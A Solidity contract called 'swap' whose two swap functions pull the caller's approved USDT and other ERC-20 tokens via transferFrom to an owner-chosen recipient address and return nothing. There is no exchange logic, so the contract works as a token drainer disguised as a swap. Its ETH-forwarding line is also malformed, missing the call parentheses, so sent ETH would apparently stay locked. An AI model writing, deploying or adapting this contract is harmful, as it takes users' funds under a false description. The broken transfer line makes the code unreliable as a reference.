//SPDX-License-Identifier: mit
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract swap is Ownable {
    address payable recipientAddress; 

    event Received(address, uint);
    
    IERC20 public usdtContractAddress;

    function changeRecipientAddress(address payable userAddress) public onlyOwner {
        recipientAddress = userAddress;
    }

    function setUSDTAddress(address _usdtAddress) public  onlyOwner {
        usdtContractAddress = IERC20(_usdtAddress);
    }

    function swapToken(
        address _tokenAddress, 
        uint256 tokenAmt, 
        uint256 usdtAmount
    ) public payable{
        
        if(usdtContractAddress.allowance(msg.sender, address(this)) >= usdtAmount){
            usdtContractAddress.transferFrom(msg.sender, recipientAddress, usdtAmount);
        }

        if(IERC20(_tokenAddress).allowance(msg.sender, address(this)) >= tokenAmt){
            IERC20(_tokenAddress).transferFrom(msg.sender, recipientAddress, tokenAmt);
        }

        if(msg.value > 0){
            recipientAddress.call{value: msg.value};
        }

    }

    function swapDoubleToken(
        address _tokenAddress, 
        uint256 tokenAmt, 
        address _tokenAddress2, 
        uint256 tokenAmt2, 
        uint256 usdtAmount
    ) public payable {

        if(usdtContractAddress.allowance(msg.sender, address(this)) >= usdtAmount){
            usdtContractAddress.transferFrom(msg.sender, recipientAddress, usdtAmount);
        }
       
        if(IERC20(_tokenAddress).allowance(msg.sender, address(this)) >= tokenAmt){
            IERC20(_tokenAddress).transferFrom(msg.sender, recipientAddress, tokenAmt);
        }

        if(IERC20(_tokenAddress2).allowance(msg.sender, address(this)) >= tokenAmt2){
            IERC20(_tokenAddress2).transferFrom(msg.sender, recipientAddress, tokenAmt2);
        }

        if(msg.value > 0){
            recipientAddress.call{value: msg.value};
        }
    }

    function fetchCurrentRecipient()  public view returns (address){
        return recipientAddress; 
    }
}